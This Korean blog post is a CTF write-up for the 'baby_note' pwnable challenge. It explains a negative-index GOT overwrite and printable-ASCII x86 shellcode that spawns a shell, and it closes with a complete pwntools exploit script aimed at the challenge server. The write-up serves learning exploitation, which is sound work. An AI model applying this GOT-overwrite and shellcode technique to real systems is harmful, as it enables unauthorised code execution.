---
layout: post
title:  "baby_note ([pwnable.tw]-death note)"
date:   2020-09-23
categories: "2020"
---

최근에 매주 월요일마다 pwnable 문제를 풀려고 하고 있는데, 친구가 이 문제를 풀어보라고 해서 풀어봤다. 처음에 뭔가 잘 보여서 쉽게 끝나나 했는데 아니었다ㅠㅠ.


내가 문제 풀려고 ida부터 키니까 `checksec`부터 하라고 훈수를 뒀다.
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```
PIE가 꺼져있고, Full RELRO가 아니다. GOT를 덮어씌울 수 있을 것 같다.

GOT를 어떻게 덮어씌울 것인지 생각해보라 그랬다. 그래서 우리가 입력 넣어주는 부분을 찾아보니 `add_note`함수가 있다.

### add_note 함수 :

![](https://images.velog.io/images/bgeunjo/post/07569ece-3e53-4c90-8bee-e6fdc2d29e17/KakaoTalk_20200908_054454698.png)

`int`형에 Index를 입력받아서 음수의 인덱스도 참조가 가능하다. 그리고 내가 입력한 문자열(Name)을 `strdup()`을 사용해 heap에 복사해주고, 그 주소를 `note[v1]`에 써준다.

🤔 `note`변수는 전역 변수라서 `bss`영역에 있다. `bss`영역보다 좀 더 작은 주소에 `got`영역이 있다.

![](https://images.velog.io/images/bgeunjo/post/ec37a06d-25f0-49c5-8eae-0f05cd9d3efd/KakaoTalk_20200908_055258561.png)

`note`변수의 주소가 `0x0804a060`이다.
![](https://images.velog.io/images/bgeunjo/post/4c9000cc-e43f-41dc-9780-1a3f54388c6d/KakaoTalk_20200908_055306475.png)

`got`영역의 주소가 `0x0804a0~`이다.

❗ Index는  (`note` - 원하는 함수(`puts`)의 `got` ) / 4로 해주면 될 것 같다. 4를 나눠주는 이유는 `v1`이 `int`라서 index * 4 만큼 주소가 커지거나 작아지기 때문이다
- 근데 / 2 해줬음.. 그래야 맞게 들어가던데 왜 그런지는 잘 모르겠다.

그럼 이제 `puts()'s got`에는 `strdup()`에 의해 내가 쓴 문자열이 복사된 곳의 주소(`heap`)가 쓰이게 된다. 그럼 내가 쓴 문자열(명령어)이 실행이 되는 것이다.

그래서 쉘코드를 쓰려고 하는데 넣을 수 있는 문자에 제한이 걸려있다.

![](https://images.velog.io/images/bgeunjo/post/e62e817c-262b-4628-976d-901206ef1598/KakaoTalk_20200908_055727963.png)

아스키코드 범위 `0x20` ~ `0x7e`의 값만 쓸 수 있다. 그래서 Ascii shellcode를 검색해서 쓰려고 하는데 잘 안된다.. 여기서 시간을 되게 많이 썼다.

🤔 우리가 평소에 쓰는 쉘코드(`shellcraft.sh()`)는 `execve(path='/bin///sh', argv=['sh'], envp=0)` 이다. `argv`는 `NULL`이 되어도 된다. 

❗ 이제 해야할 일이 정해졌다! 
- `syscall(int 80)`을 이용해 `execve`를 호출할 것이기 때문에 `syscall` 호출 규약에 맞게 인자를 세팅해준다.
- `syscall_table`을 참고하면 `execve`는 `eax=11`일 때 실행 된다.

### 쉘코드 작성

쉘코드를 작성해보자.

```
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx      
    push 0x31
    pop eax
    xor al,0x31
    dec eax
    xor ax,0x3f50
    xor ax,0x4062
    push eax
    pop edi                               
    push 0x3b    
    pop eax
    xor al,0x30
    push edx
    pop esi
    push ecx
    pop edx
    push edx
    pop edx
    push edx
    pop edx
    push edx
    xor [esi+0x30],di
```

처음부터 ㅂㅂㅈ ㅂㅂㅈ~ 🚀

```
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
```
문자열 `/bin///sh`를 스택에 푸쉬해준다. `/bin/sh`가 아니라 `/bin///sh`를 쓴 이유가 뭘까?
- `/bin/sh`를 쓰게 되면 `push 0x68732f`를 하게 된다. 즉 opcode에 `0x00`이 포함되게 되어, 허용되는 아스키코드 범위를 벗어난다.
- `/bin//sh`를 해주게 되면 `push 0x68732f2f`를 하게 되는데, 끝에 `NULL`이 없어 내가 원치 않는 문자열까지 뒤에 연결되게 된다.

```
    push esp
    pop ebx
```
`ESP`는 현재 `/bin///sh`를 가리키고 있다. 그 문자열의 주소를 `EBX`에 넣어준다. `syscall`의 매개변수 세팅을 위해서다.


```
    push 0x31
    pop eax
    xor al,0x31
    dec eax
    xor ax,0x3f50
    xor ax,0x4062
    push eax
    pop edi   
```

`EAX`를 0으로 세팅한 후, 1을 감소시켜서 `0xffffffff`로 만든다. 가장 만드는데 골치 아픈 `0x80cd`(int 0x80=`syscall`) opcode를 편하게 만들기 위해 1을 다 on 시켜준 것이다. 그리고 적당한 값을 xor해서 `0x80cd`를 만들어준다. `xor eax, ~`는 허용되는 아스키코드 범위를 넘어가는 opcode를 만들기 때문에 `xor ax, ~`로 해준다. 
그렇게 만든 값을 `edi`에 넣어준다. `eax`는 이 후에도 써야 하는데, `edi`는 쓰이는 곳이 없기 때문이다.

```
    push 0x3b    
    pop eax
    xor al,0x30
````

`execve()`를 호출하기 위해서는 `syscall`할 때 `eax=11`이어야 하기 때문에, 세팅해준다.

```
    push edx
    pop esi
    push ecx
    pop edx
```

`puts()`를 실행시키는 시점에 `edx`는 내가 쓴 문자열의 시작주소(`heap`)를 가리키고 있다.
근데 `syscall` 매개변수 세팅해줄 때 `edx=0`을 맞춰줘야 하기 때문에 `esi`에 넣어놓고, 이미 0이었던 `ecx`를 이용해 `edx`를 0으로 만든다.(이거 까먹어서 욕먹음 ㅠ)

``` 
    push edx
    pop edx
    push edx
    pop edx
    push edx
    xor [esi+0x30],di
```
`xor [esi+0x30],di`에서 `0x30`은 내가 입력한 명령어의 총 길이다. 문자열(명령어)이 끝나는 곳에 `0x80CD`를 넣어준다.
마지막에 `push edx pop edx` 들은 길이를 맞춰주려고 아무거나 넣은거다. 걍 아스키코드 범위에 들어가는 거 아무거나 써도 된다. 길이를 안 맞춰주니까 내가 쓴 문자열 + a 에 이미 쓰여진 값이 있었는데, 그 값에 영향을 받아 원하는 값이 안 들어갔다. 

![](https://images.velog.io/images/bgeunjo/post/a9b97bed-28fe-4794-a520-658cf7665e5f/baby_note3.PNG)

`xor [esi+0x30],di`을 실행하는 시점의 레지스터 상태이다. `syscall`의 매개변수로 쓰이는 `ecx`,`edx`는 0으로 세팅되어 있고 `ebx`는 `/bin///sh`를 주소를 담고 있다.
`syscall_table`에서 `execve()`에 해당하는 11(`0xb`)가 `eax`에 세팅되어 있다. `edi` 중에서 `di`부분만 보면 `0x80cd(int 0x80)`로 세팅되어 있다.

![](https://images.velog.io/images/bgeunjo/post/110ae669-66df-48db-8e8c-69c6956f833b/baby_note2.PNG)

마지막 명령어를 실행하고 나면 위치에 딱 맞게 `int 0x80`이 들어간 것을 확인할 수 있다. 이제 저 명령어(`syscall`)를 실행해주면 쉘이 따진다!

### Exploit code

``` python
from pwn import *
import sys

if len(sys.argv) != 2:
    log.info("try options -l for local, -r for remote")
    exit()
if sys.argv[1].strip()=='-l':
    p=process('./baby_note')
elif sys.argv[1].strip()=='-r':
    p=remote("srv.cykor.kr",31009)

#context.log_level='debug'
e=ELF('./baby_note')

bss=e.bss()
puts_got=e.got['puts']
offset=(puts_got-bss)/2

shellcode="""
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx      
    push 0x31
    pop eax
    xor al,0x31
    dec eax
    xor ax,0x3f50
    xor ax,0x4062
    push eax
    pop edi                               
    push 0x3b    
    pop eax
    xor al,0x30
    push edx
    pop esi
    push ecx
    pop edx
    push edx
    pop edx
    push edx
    pop edx
    push edx
    xor [esi+0x30],di
"""
shellcode=asm(shellcode)
log.info("shellcode Length: "+str(hex(len(shellcode))))
log.info(shellcode)

#gdb.attach(p)
p.recvuntil("Your choice :")
p.sendline("1")
p.recvuntil("Index :")
p.sendline(str(offset))
p.recvuntil("Name :")
#raw_input()
p.sendline(shellcode)
#raw_input()
p.interactive()
```

![](https://images.velog.io/images/bgeunjo/post/39c971db-d3e5-4a04-abe2-84b06ae0490d/shell.PNG)